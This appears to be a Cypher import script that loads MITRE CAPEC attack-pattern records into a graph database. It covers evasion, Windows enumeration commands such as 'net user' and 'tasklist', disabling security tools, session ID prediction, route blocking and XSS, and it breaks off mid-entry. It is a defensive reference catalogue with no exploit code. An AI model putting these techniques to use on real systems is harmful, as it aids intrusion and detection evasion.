CREATE (:Description{id: 503, summary: "OrderedDict([('Text', [\"This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to place man in the middle once SSL is terminated. Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with an XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required. Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The attacker can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated.\", \"Once the attacker gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme.\"])])"});
MERGE (:CWE{id: 300});
MERGE (:CWE{id: 287});
MERGE (:CWE{id: 724});
MERGE (:CWE{id: 693});
CREATE (:AttackPattern{id: 570, name: "Signature-Based Avoidance", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 510});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 504, summary: "OrderedDict([('Text', 'Software packing is a method of compressing or encrypting an executable. The act of packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques to evade defenses that do not leave the same artifacts as well-known packers.')])"});
MERGE (:Reference{local_id: "R.570.1", author: "ATT&CK Project", title: "Software Packing (1045)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Software_packing"});
CREATE (:AttackPattern{id: 571, name: "Block Logging to Central Repository", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 511});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 505, summary: "OrderedDict([('Text', 'An adversary may attempt to block indicators from leaving the host machine. In the case of network based reporting of indicators, an adversary may block traffic associated with reporting to prevent central station analysis. This may be accomplished by many means such as stopping a local process to creating a host-based firewall rule to block traffic to a specific server.')])"});
MERGE (:Reference{local_id: "R.571.1", author: "ATT&CK Project", title: "Indicator Blocking on Host (1054)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Indicator_blocking_on_host"});
CREATE (:AttackPattern{id: 572, name: "Artificially Inflate File Sizes", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 512});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 506, summary: "OrderedDict([('Text', \"Security tools often inspect executables to determine if they are malicious. Adversaries may add data to executables to increase the executable size beyond what security tools are capable of handling. Adding data to an executable also changes the file's hash, frustrating security tools that look for known bad files by their hash.\")])"});
MERGE (:Reference{local_id: "R.572.1", author: "ATT&CK Project", title: "Binary padding (1009)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Binary_padding"});
CREATE (:AttackPattern{id: 573, name: "Process Footprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 513});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 507, summary: "OrderedDict([('Text', 'Adversaries may attempt to get information about running processes. An example Windows command that would display information about processes is \"tasklist\".')])"});
MERGE (:Reference{local_id: "R.573.1", author: "ATT&CK Project", title: "Process enumeration (1057)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Process_enumeration"});
CREATE (:AttackPattern{id: 574, name: "Services Footprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 514});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 508, summary: "OrderedDict([('Text', 'Adversaries may try to get information about registered services. Window commands that may obtain information about services are \"sc\" and \"net start\".')])"});
MERGE (:Reference{local_id: "R.574.1", author: "ATT&CK Project", title: "Service enumeration (1007)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Service_enumeration"});
CREATE (:AttackPattern{id: 575, name: "Account Footprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 515});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 509, summary: "OrderedDict([('Text', 'Adversaries may attempt to get a listing of all local or domain accounts and their permissions. Example Windows commands which can acquire this information are: \"net user\" and \"dsquery\".')])"});
MERGE (:Reference{local_id: "R.575.1", author: "ATT&CK Project", title: "Account enumeration (1087)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Account_enumeration"});
CREATE (:AttackPattern{id: 576, name: "Group Permission Footprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 516});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 510, summary: "OrderedDict([('Text', 'Adversaries may get a listing of all local groups and their permissions and members. An example Windows command which can list local groups is \"net localgroup\".')])"});
MERGE (:Reference{local_id: "R.576.1", author: "ATT&CK Project", title: "Group permissions enumeration (1069)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Group_permissions_enumeration"});
CREATE (:AttackPattern{id: 577, name: "Owner Footprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 517});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 511, summary: "OrderedDict([('Text', 'Adversaries may attempt to identify the primary users of the system. They may do this, for example, by reviewing logins or file modification times. An example Windows command that may accomplish this is \"dir /A ntuser.dat\". Which will display the last modified time of a user\\'s ntuser.dat file when run within the root folder of a user. This time is synonymous with the last time that user was logged in. Administrator permissions are required to view the home folder of other users.')])"});
MERGE (:Reference{local_id: "R.577.1", author: "ATT&CK Project", title: "Owner/user enumeration (1033)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Owner/user_enumeration"});
CREATE (:AttackPattern{id: 578, name: "Disable Security Software", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 518});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 512, summary: "OrderedDict([('Text', 'Adversaries may disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods.')])"});
MERGE (:Reference{local_id: "R.578.1", author: "ATT&CK Project", title: "Disabling Security Tools", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Disabling_security_tools"});
CREATE (:AttackPattern{id: 579, name: "Replace Winlogon Helper DLL", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 519});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 513, summary: "OrderedDict([('Text', 'Winlogon is a part of Windows that performs logon actions. In Windows systems prior to Windows Vista, a registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup.')])"});
MERGE (:Reference{local_id: "R.579.1", author: "ATT&CK Project", title: "Winlogon helper DLL (1004)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Winlogon_helper_DLL"});
CREATE (:AttackPattern{id: 58, name: "Restful Privilege Elevation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 427, text: "<div level=\"0\">\n  <p class=\"text\">The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete.</p>\n</div>"});
CREATE (:Submission{id: 520});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 330});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 514, summary: "OrderedDict([('Text', [\"Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side.\", 'The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server.'])])"});
MERGE (:Reference{local_id: "R.58.1", author: "Mark O'Neill", title: "Security for REST Web Services", publisher: "Vprde;", link: "http://www.vordel.com/downloads/rsa_conf_2006.pdf"});
MERGE (:CWE{id: 267});
MERGE (:CWE{id: 269});
MERGE (:CWE{id: 264});
CREATE (:AttackPattern{id: 580, name: "Application Footprinting", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 521});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 515, summary: "OrderedDict([('Text', \"An adversary engages in active probing and exploration activities to determine the type or version of an application installed on a remote target. This differs from fingerprinting where the attacker's action is passive through the examination of application output.\")])"});
CREATE (:AttackPattern{id: 581, name: "Security Software Footprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 522});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 516, summary: "OrderedDict([('Text', 'Adversaries may attempt to get a listing of security tools that are installed on the system and their configurations. This may include security related system features (such as a built-in firewall or anti-spyware) as well as third-party security software.')])"});
MERGE (:Reference{local_id: "R.581.1", author: "ATT&CK Project", title: "Security software enumeration (1063)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Security_software_enumeration"});
CREATE (:AttackPattern{id: 582, name: "Route Disabling", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 428, text: "<div level=\"0\">\n  <p class=\"text\">The adversary requires knowledge of and access to network route.</p>\n</div>"});
CREATE (:Submission{id: 523});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-02-14"});
CREATE (:Description{id: 517, summary: "OrderedDict([('Text', 'An adversary disables the network route between two targets. The goal is to completely sever the communications channel between two entities. This is often the result of a major error or the use of an \"Internet kill switch\" by those in control of critical infrastructure. This attack pattern differs from most other obstruction patterns by targeting the route itself, as opposed to the data passed over the route.')])"});
CREATE (:AttackPattern{id: 583, name: "Disabling Network Hardware", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 429, text: "<div level=\"0\">\n  <p class=\"text\">The adversary requires physical access to the targeted communications equipment (networking devices, cables, etc.), which may be spread over a wide area.</p>\n</div>"});
CREATE (:Submission{id: 524});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-12"});
CREATE (:Description{id: 518, summary: "OrderedDict([('Text', 'In this attack pattern, an adversary physically disables networking hardware by powering it down or disconnecting critical equipment. Disabling or shutting off critical system resources prevents them from performing their service as intended, which can have direct and indirect consequences on other systems. This attack pattern is considerably less technical than the selective blocking used in most obstruction attacks.')])"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", title: "Analysis of Country-wide Internet Outages Caused by Censorship", publisher: "Center for Applied Internet Data Analysis", pubdate: "2011", link: "http://www.caida.org/publications/papers/2011/outages_censorship/outages_censorship.pdf"});
CREATE (:AttackPattern{id: 584, name: "BGP Route Disabling", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 430, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must have control of a router that can modify, drop, or introduce spoofed BGP updates.</p>\n  <p class=\"text\">The adversary can convince</p>\n</div>"});
CREATE (:Submission{id: 525});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-12"});
CREATE (:Description{id: 519, summary: "OrderedDict([('Text', 'An adversary suppresses the Border Gateway Protocol (BGP) advertisement for a route so as to render the underlying network inaccessible. The BGP protocol helps traffic move throughout the Internet by selecting the most efficient route between Autonomous Systems (AS), or routing domains. BGP is the basis for interdomain routing infrastructure, providing connections between these ASs. By suppressing the intended AS routing advertisements and/or forcing less effective routes for traffic to ASs, the adversary can deny availability for the target network.')])"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", title: "Why is it Taking so Long to Secure Internet Routing?", publisher: "ACM", pubdate: "2014", link: "https://queue.acm.org/detail.cfm?id=2668966"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", title: "Beware of BGP Attacks", publisher: "ACM SIGCOMM", pubdate: "2004", link: "http://www.cc.gatech.edu/~dovrolis/Papers/ccr-bgp.pdf"});
CREATE (:ResourcesRequired{id: 240, text: "<div level=\"0\">\n  <p class=\"text\">BGP Router</p>\n</div>"});
CREATE (:AttackPattern{id: 585, name: "DNS Domain Seizure", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 431, text: "<div level=\"0\">\n  <p class=\"text\">This attack pattern requires that the adversary has cooperation from the registrar of the target domain.</p>\n</div>"});
CREATE (:Submission{id: 526});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-12"});
CREATE (:Description{id: 520, summary: "OrderedDict([('Text', \"In this attack pattern, an adversary influences a target's web-hosting company to disables a target domain. The goal is to prevent access to the targeted service provided by that domain. It usually occurs as the result of civil or criminal legal interventions.\")])"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", title: "Dozens of Online 'Dark Markets' Seized Pursuant to Forfeiture Complaint Filed in Manhattan Federal Court in Conjunction with the Arrest of the Operator of Silk Road 2.0", publisher: "FBI", pubdate: "2014", link: "https://www.fbi.gov/contact-us/field-offices/newyork/news/press-releases/dozens-of-online-dark-markets-seized-pursuant-to-forfeiture-complaint-filed-in-manhattan-federal-court-in-conjunction-with-the-arrest-of-the-operator-of-silk-road-2.0"});
CREATE (:AttackPattern{id: 586, name: "Object Injection", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:AttackPrerequisite{id: 432, text: "<div level=\"0\">\n  <p class=\"text\">The target application must unserialize data before validation.</p>\n</div>"});
CREATE (:Submission{id: 527});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2017-02-06"});
CREATE (:Description{id: 521, summary: "OrderedDict([('Text', 'An adversary attempts to exploit an application by injecting additional, malicious content during its processing of serialized objects. Developers leverage serialization in order to convert data or state into a static, binary format for saving to disk or transferring over a network. These objects are then deserialized when needed to recover the data/state. By injecting a malformed object into a vulnerable application, an adversary can potentially compromise the application by manipulating the deserialization process. This can result in a number of unwanted outcomes, including remote code execution.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.17.1", title: "CWE-502: Deserialization of Untrusted Data", publisher: "MITRE", pubdate: "January 2017"});
MERGE (:Reference{id: "REF-2", local_id: "R.17.1", title: "Deserialization of Untrusted Data", publisher: "OWASP", pubdate: "January 2017"});
CREATE (:AttackPattern{id: 587, name: "Cross Frame Scripting (XFS)", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 433, text: "<div level=\"0\">\n  <p class=\"text\">The user's browser must have vulnerabilities in its implementation of the same-origin policy. It allows certain data in a loaded page to originate from different servers/domains.</p>\n</div>"});
CREATE (:Submission{id: 528});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2017-02-01"});
CREATE (:Description{id: 522, summary: "OrderedDict([('Text', 'This attack pattern combines malicious Javascript and a legitimate webpage loaded into a concealed iframe. The malicious Javascript is then able to interact with a legitimate webpage in a manner that is unknown to the user. This attack usually leverages some element of social engineering in that an attacker must convinces a user to visit a web page that the attacker controls.')])"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", title: "Cross Frame Scripting", publisher: "OWASP", pubdate: "2016", link: "https://www.owasp.org/index.php/Cross_Frame_Scripting"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", author: "Gustave Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson", title: "Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites", pubdate: "July 20, 2010", link: "https://seclab.stanford.edu/websec/framebusting/framebust.pdf"});
CREATE (:AttackPattern{id: 588, name: "DOM-Based XSS", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 434, text: "<div level=\"0\">\n  <p class=\"text\">An application that leverages a client-side web browser with scripting enabled.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 435, text: "<div level=\"0\">\n  <p class=\"text\">An application that manipulates the DOM via client-side scripting.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 436, text: "<div level=\"0\">\n  <p class=\"text\">An application that failS to adequately sanitize or encode untrusted input.</p>\n</div>"});
CREATE (:Submission{id: 529});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2017-04-15"});
CREATE (:Description{id: 523, summary: "OrderedDict([('Text', 'This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.')])"});
CREATE (:CVE{id: "CVE-2015-3429", description: "<div level=\"0\">\n  <p class=\"text\">Cross-site scripting (XSS) vulnerability in example.html in Genericons before 3.3.1, as used in WordPress before 4.2.2, allows remote attackers to inject arbitrary web script or HTML via a fragment identifier.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2012-5650", description: "<div level=\"0\">\n  <p class=\"text\">Cross-site scripting (XSS) vulnerability in the Futon UI in Apache CouchDB before 1.0.4, 1.1.x before 1.1.2, and 1.2.x before 1.2.1 allows remote attackers to inject arbitrary web script or HTML via unspecified parameters to the browser-based test suite.</p>\n</div>"});
MERGE (:CWE{id: 79});
MERGE (:CWE{id: 20});
CREATE (:ResourcesRequired{id: 241, text: "<div level=\"0\">\n  <p class=\"text\">No specialized hardware or software resources are required to launch this type of attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 589, name: "DNS Blocking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 437, text: "<div level=\"0\">\n  <p class=\"text\">This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.</p>\n</div>"});
CREATE (:Submission{id: 530});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-12"});
CREATE (:Description{id: 524, summary: "OrderedDict([('Text', 'An adversary intercepts traffic and intentionally drops DNS requests based on content in the request. In this way, the adversary can deny the availability of specific services or content to the user even if the IP address is changed.')])"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", title: "Censorship in the Wild: Analyzing Internet Filtering in Syria", publisher: "Sigcomm", pubdate: "2014", link: "http://conferences2.sigcomm.org/imc/2014/papers/p285.pdf"});
CREATE (:AttackPattern{id: 59, name: "Session Credential Falsification through Prediction", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 438, text: "<div level=\"0\">\n  <p class=\"text\">The target host uses session IDs to keep track of the users.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 439, text: "<div level=\"0\">\n  <p class=\"text\">Session IDs are used to control access to resources.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 440, text: "<div level=\"0\">\n  <p class=\"text\">The session IDs used by the target host are predictable. For example, the session IDs are generated using predictable information (e.g., time).</p>\n</div>"});
CREATE (:Submission{id: 531});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 525, summary: "OrderedDict([('Text', 'This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Find Session IDs", description: "<div level=\"0\">\n  <p class=\"text\">The attacker interacts with the target host and finds that session IDs are used to authenticate users.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker makes many anonymous connections and records the session IDs assigned.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">An attacker makes authorized connections and records the session tokens or credentials issued.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Web applications use session IDs</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Network systems issue session IDs or connection IDs</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Characterize IDs", description: "<div level=\"0\">\n  <p class=\"text\">The attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDs</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Patterns are detectable in session IDs"});
CREATE (:Outcome{id: 2, type: "Failure", description: "Session IDs pass NIST FIPS 140 statistical tests for cryptographic randomness."});
CREATE (:Outcome{id: 3, type: "Success", description: "Session IDs are repeated."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Match issued IDs", description: "<div level=\"0\">\n  <p class=\"text\">The attacker brute forces different values of session ID and manages to predict a valid session ID.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker models the session ID algorithm enough to produce a compatible session IDs, or just one match.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Session identifiers successfully spoofed"});
CREATE (:Outcome{id: 2, type: "Failure", description: "No session IDs can be found or exploited"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Use matched Session ID", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the falsified session ID to access the target system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker loads the session ID into his web browser and browses to restricted data or functionality.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker loads the session ID into his network communications and impersonates a legitimate user to gain access to data or functionality.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.59.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 290});
MERGE (:CWE{id: 330});
MERGE (:CWE{id: 331});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 488});
MERGE (:CWE{id: 539});
MERGE (:CWE{id: 200});
MERGE (:CWE{id: 6});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 384});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 719});
CREATE (:AttackPattern{id: 590, name: "IP Address Blocking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 441, text: "<div level=\"0\">\n  <p class=\"text\">This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.</p>\n</div>"});
CREATE (:Submission{id: 532});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-12"});
CREATE (:Description{id: 526, summary: "OrderedDict([('Text', 'An adversary performing this type of attack drops packets destined for a target IP address. The aim is to prevent access to the service hosted at the target IP address.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.17.1", author: "['Abdelberi Chaabane', 'Terence Chen', 'Mathieu Cunche', 'Emiliano De Cristofaro', 'Arik Friedman', 'Mohamed Ali Kaafar']", title: "Censorship in the Wild: Analyzing Internet Filtering in Syria", publisher: "IMC 2014", pubdate: "February 2014"});
CREATE (:AttackPattern{id: 591, name: "Reflected XSS", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 442, text: "<div level=\"0\">\n  <p class=\"text\">An application that leverages a client-side web browser with scripting enabled.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 443, text: "<div level=\"0\">\n  <p class=\"text\">An application that fail to adequately sanitize or encode untrusted input.</p>\n</div>"});
CREATE (:Submission{id: 533});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2017-04-15"});
CREATE (:Description{id: 527, summary: "OrderedDict([('Text', \"This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is “reflected” off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application. The most common method of this is through a phishing email where the adversary embeds the malicious script with a URL that the victim then clicks on. In processing the subsequent request, the vulnerable web application incorrectly considers the malicious script as valid input and uses it to creates a reposnse that is then sent back to the victim. To launch a successful Reflected XSS attack, an adversary looks for places where user-input is used directly in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.\")])"});
MERGE (:Reference{local_id: "R.591.1", author: "Watchfire Research", title: "XSS vulnerabilities in Google.com", pubdate: "Dec 21 2005", link: "http://seclists.org/fulldisclosure/2005/Dec/1107"});
CREATE (:CVE{id: "CVE-2006-5442", description: "<div level=\"0\">\n  <p class=\"text\">ViewVC 1.0.2 and earlier does not specify a charset in its HTTP headers or HTML documents, which allows remote attackers to conduct cross-site scripting (XSS) attacks that inject arbitrary UTF-7 encoded JavaScript code via a view.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-3918", description: "<div level=\"0\">\n  <p class=\"text\">http_protocol.c in (1) IBM HTTP Server 6.0 before 6.0.2.13 and 6.1 before 6.1.0.1, and (2) Apache HTTP Server 1.3 before 1.3.35, 2.0 before 2.0.58, and 2.2 before 2.2.2, does not sanitize the Expect header from an HTTP request when it is reflected back in an error message, which might allow cross-site scripting (XSS) style attacks using web client components that can send arbitrary headers in requests, as demonstrated using a Flash SWF file.</p>\n</div>"});
MERGE (:CWE{id: 79});
MERGE (:CWE{id: 20});
CREATE (:ResourcesRequired{id: 243, text: "<div level=\"0\">\n  <p class=\"text\">No specialized hardware or software resources are required to launch this type of attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 592, name: "Stored XSS", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 444, text: "<div level=\"0\">\n  <p class=\"text\">An application that leverages a client-side web browser with scripting enabled.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 445, text: "<div level=\"0\">\n  <p class=\"text\">An application that fails to adequately sanitize or encode untrusted input.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 446, text: "<div level=\"0\">\n  <p class=\"text\">An application that stores information provided by the user in data storage of some kind.</p>\n</div>"});
CREATE (:Submission{id: 534});
MERGE (:Person{name: "CAPEC Content Team"});
